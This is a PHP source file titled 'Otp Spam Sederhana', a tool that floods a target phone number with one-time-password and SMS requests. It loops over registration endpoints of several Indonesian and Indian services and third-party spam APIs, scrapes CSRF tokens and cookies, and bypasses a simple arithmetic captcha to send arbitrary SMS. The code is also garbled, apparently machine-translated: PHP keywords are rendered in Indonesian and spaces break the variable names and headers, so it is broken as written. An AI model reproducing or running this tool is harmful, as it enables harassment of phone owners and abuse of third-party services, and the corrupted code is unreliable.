<? php
namespace SimpleSpam;

kelas Otp {
	/ *
	* Nama: Otp Spam Sederhana
	* File: otp.php
	* Penulis: DulLah
	* Github: https://github.com/dz-id
	* Telegram: https://t.me/unikers
	* Tanggal: 26-01-2020
	* Versi: 1.0
	* /
	$ agent statis terlindungi;

	function __construct () {
		self :: $ agent = "Mozilla / 5.0 (Linux; Android 6.0.1; SM-G920V Build / MMB29K) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 52.0.2743.98 Mobile Safari / 537.36";
		ini_set ("max_execution_time", 0);
		ini_set ("memory_limit", "99999M");
		set_time_limit (0);
	}

	fungsi pribadi GetCookieMyPoin () {
		$ ch = curl_init ("https://mypoin.id/register/validate-phone-number");
		curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ ch, CURLOPT_HEADER, 1);
		curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
		$ html = curl_exec ($ ch);
		$ fields = array ();
		curl_close ($ ch);
		preg_match_all ('/ ^ Set-Cookie: \ s * ([^;] *) / mi', $ html, $ cookie);
		foreach ($ cookie [1] sebagai $ kuki) {
			array_push ($ bidang, $ kuki);
		}

		$ dom = new \ DomDocument ();
		@ $ dom-> loadHTML ($ html);

		$ tag = $ dom-> getElementsByTagName ("input");
		foreach ($ tag as $ token) {

			$ csr = $ token-> getAttribute ("name");

			if (strpos ($ csr, "csrfmiddlewaretoken")! == False) {
				array_push ($ fields, $ token-> getAttribute ("value"));
				istirahat;
			}
		}
		mengembalikan $ bidang;
	}

	MyPoin fungsi publik ($ nomor, $ loop) {
		$ cookie = self :: GetCookieMyPoin ();
		$ param = array (
			"phone" => $ nomor,
			"csrfmiddlewaretoken" => $ cookie [2]
		);
		$ header = array (
			"Tuan rumah: mypoin.id",
			"Koneksi: tetap hidup",
			"Sec-Fetch-Site: same-origin",
			"Sec-Fetch-Mode: cors",
			"Terima: aplikasi / json, teks / javascript, * / *; q = 0,01",
			"Tipe-Konten: application / x-www-form-urlencoded; charset = UTF-8",
			"Bahasa Terima: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7, nb; q = 0.6",
			"Asal: https://mypoin.id",
			"X-Diminta-Dengan: XMLHttpRequest",
			"Perujuk: https://mypoin.id/register/validate-phone-number",
			"Cookie: $ cookie [0]; _ga = GA1.2.1152780872.1579970310; _gid = GA1.2.1621783.1579970310; $ cookie [1]; _gat_gtag_UA_108385159_1 = 1"
		);

		untuk ($ i = 0; $ i <$ loop; $ i ++) {
			$ ch = curl_init ("https://mypoin.id/register/request-otp");
			curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt ($ ch, CURLOPT_POST, 1);
			curl_setopt ($ ch, CURLOPT_POSTFIELDS, http_build_query ($ param));
			curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
			curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ header);
			$ response = curl_exec ($ ch);
			curl_close ($ ch);

			if (strpos ($ response, "ok")! == False) {
				echo "\ e [92m [$ i] \ e [0mTerkirim! \ n";

			} lain jika (strpos ($ response, "1 menit")! == False) {
				echo "\ e [91m [$ i] \ e [0mTunggu 1 Menit Gan \ n";
				tidur (60);

			} lain {
				echo "\ e [91m [$ i] \ e [0mGagal! \ n";
			}
		}
	}

	fungsi publik AltBaljai ($ nomor, $ loop) {
		$ enc = json_encode ([
			"country_code" => "62",
			"phone_number" => substr ($ nomor, 2, 13),
		]);

		$ header = [
			"User-Agent:" .self :: $ agent,
			"Tipe-Konten: application / json; charset = UTF-8",
			"Panjang Konten:" .strlen ($ enc),
		];
		untuk ($ i = 0; $ i <$ loop; $ i ++) {
			$ ch = curl_init ("https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID");
			curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt ($ ch, CURLOPT_POST, 1);
			curl_setopt ($ ch, CURLOPT_POSTFIELDS, $ enc);
			curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
			curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ header);
			$ response = curl_exec ($ ch);
			curl_close ($ ch);
			$ response = json_decode ($ response, true);
			if ($ response ["status"]! == "error") {
				echo "\ e [92m [$ i] \ e [0mTerkirim! \ n";

			} lain jika ($ response ["message"] == "Batas SMS terlampaui") {
				echo "\ e [91m [$ i] \ e [0mLimit gan awokawok! \ n";

			} lain {
				echo "\ e [91m [$ i] \ e [0mGagal! \ n";
			}
		}
	}

	fungsi pribadi GetKeyPayuTerus () {
		$ ch = curl_init ("http://sms.payuterus.biz/alpha/?a=keluar");
		curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
		curl_setopt ($ ch, CURLOPT_HEADER, 1);
		curl_setopt ($ ch, CURLOPT_HTTPHEADER, array (
			"Referer: http://sms.payuterus.biz/alpha/send.php",
			"User-Agent:" .self :: $ agent,
		));
		$ keys = array ();
		$ html = curl_exec ($ ch);
		curl_close ($ ch);
		preg_match_all ('/ ^ Set-Cookie: \ s * ([^;] *) / mi', $ html, $ cookie);
		preg_match ('/ name = \ "key \" value = \ "(. *?) \"> /', $ html, $ key);
		preg_match ('/ <span> (. *?) = /', $ html, $ bypass);
		$ jml = meledak ("+", $ bypass [1]);
		$ jml = $ jml [0] + $ jml [1];
		array_push ($ keys, array (
			"cookie" => $ cookie [1] [0]. ";". $ cookie [1] [1],
			"jumlah" => $ jml,
			"key" => $ key [1],
		));
		return $ keys [0];
	}

	fungsi publik SmsPayuTerusBis ($ nomor, $ msg) {
		$ keys = self :: GetKeyPayuTerus ();

		$ form = array (
			"nohp" => $ nomor,
			"pesan" => $ msg,
			"captcha" => $ keys ["jumlah"],
			"key" => $ keys ["key"]
		);
		$ header = array (
			"Terima: teks / html, aplikasi / xhtml + xml, aplikasi / xml; q = 0,9, gambar / webp, * / *; q = 0,8",
			"Referer: http://sms.payuterus.biz/alpha/",
			"Asal: http://sms.payuterus.biz",
			"Pragma: no-cache",
			"Cache-Control: no-cache",
			"Koneksi: tetap hidup",
			"Tipe-Konten: application / x-www-form-urlencoded",
			"Bahasa Terima: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7, nb; q = 0.6",
			"Cookie:". $ Keys ["cookie"],
			"User-Agent:" .self :: $ agent,
		);

		$ ch = curl_init ("http://sms.payuterus.biz/alpha/send.php");
		curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ ch, CURLOPT_POSTFIELDS, http_build_query ($ form));
		curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
		curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ header);
		$ send = curl_exec ($ ch);
		curl_close ($ ch);
		return $ send;
	}

	fungsi publik TokoTalk ($ nomor, $ loop) {
		$ header = array (
			"User-Agent:" .self :: $ agent,
			"Terima: aplikasi / json, teks / polos, * / *",
			"Tuan rumah: masterkadal.com",
			"Perujuk: https://masterkadal.com/tools/tokotalk/",
			"Bahasa Terima: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7, nb; q = 0.6",
			"Sec-Fetch-Site: same-origin",
			"Sec-Fetch-Mode: cors",
			"Koneksi: tetap hidup"
		);
		untuk ($ i = 0; $ i <$ loop; $ i ++) {
			$ ch = curl_init ("https://masterkadal.com/api/tokotalk/?nomer=$nomor");
			curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
			curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ header);
			$ response = curl_exec ($ ch);
			curl_close ($ ch);
			if (strpos ($ response, "SMS sukses")) {
				echo "\ e [92m [$ i] \ e [0m Terkirim \ n";

			} lain {
				echo "\ e [91m [$ i] \ e [0m Gagal \ n";
			}
		}
	}

	fungsi pribadi Posting ($ data, $ header, $ loop, $ api) {

		untuk ($ i = 0; $ i <$ loop; $ i ++) {
			$ ch = curl_init ($ api);
			curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt ($ ch, CURLOPT_POST, 1);
			curl_setopt ($ ch, CURLOPT_POSTFIELDS, http_build_query ($ data));
			curl_setopt ($ ch, CURLOPT_USERAGENT, self :: $ agent);
			curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ header);
			$ response = curl_exec ($ ch);
			curl_close ($ ch);
			if (strpos ($ response, "Terkirim")) {
				echo "\ e [92m [$ i] \ e [0m Terkirim \ n";

			} lain {
				echo "\ e [91m [$ i] \ e [0m Gagal \ n";
			}
		}
	}

	fungsi publik Lainnya ($ nomor, $ loop, $ type) {
		if ($ type == "OyoHotels") {
			self :: Posting (
				Himpunan(
					"nomor" => $ nomor,
					"jumlah" => "1",
				),
				Himpunan(
					"User-Agent:" .self :: $ agent,
					"X-Diminta-Dengan: XMLHttpRequest",
					"Tipe-Konten: application / x-www-form-urlencoded; charset = UTF-8",
					"Asal: https://nabill.me",
					"Terima: * / *",
					"Tuan rumah: nabill.me",
					"Sec-Fetch-Site: same-origin",
					"Sec-Fetch-Mode: cors",
					"Perujuk: https://nabill.me/Spam_SMS_Oyo",
					"Bahasa Terima: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7, nb; q = 0.6",
					"Koneksi: tetap hidup"
				),
				$ loop, "https://nabill.me/Tools/Prank-Tools/Spam-SMS-Oyo/api.php"
			);
		} lain jika ($ type == "AyoSrc") {
			self :: Posting (
				Himpunan(
					"nomor" => $ nomor,
					"jumlah" => "1",
				),
				Himpunan(
					"User-Agent:" .self :: $ agent,
					"X-Diminta-Dengan: XMLHttpRequest",
					"Tipe-Konten: application / x-www-form-urlencoded; charset = UTF-8",
					"Asal: https://nabill.me",
					"Terima: * / *",
					"Tuan rumah: nabill.me",
					"Sec-Fetch-Site: same-origin",
					"Sec-Fetch-Mode: cors",
					"Referer: https://nabill.me/Ayo_Src_Bom",
					"Bahasa Terima: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7, nb; q = 0.6",
					"Koneksi: tetap hidup"
				),
				$ loop, "https://nabill.me/Tools/Prank-Tools/Ayo-Src/api.php"
			);
		} lain jika ($ type == "CodaShopTsel") {
			self :: Posting (
				Himpunan(
					"nomor" => $ nomor,
					"jumlah" => "1",
				),
				Himpunan(
					"User-Agent:" .self :: $ agent,
					"X-Diminta-Dengan: XMLHttpRequest",
					"Tipe-Konten: application / x-www-form-urlencoded; charset = UTF-8",
					"Asal: https://nabill.me",
					"Terima: * / *",
					"Tuan rumah: nabill.me",
					"Sec-Fetch-Site: same-origin",
					"Sec-Fetch-Mode: cors",
					"Perujuk: https://nabill.me/Codashop_Spam_Telkomsel",
					"Bahasa Terima: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7, nb; q = 0.6",
					"Koneksi: tetap hidup"
				),
				$ loop, "https://nabill.me/Tools/Prank-Tools/Codashop-Spam-Telkomsel/api.php"
			);
		}
	}
}?>
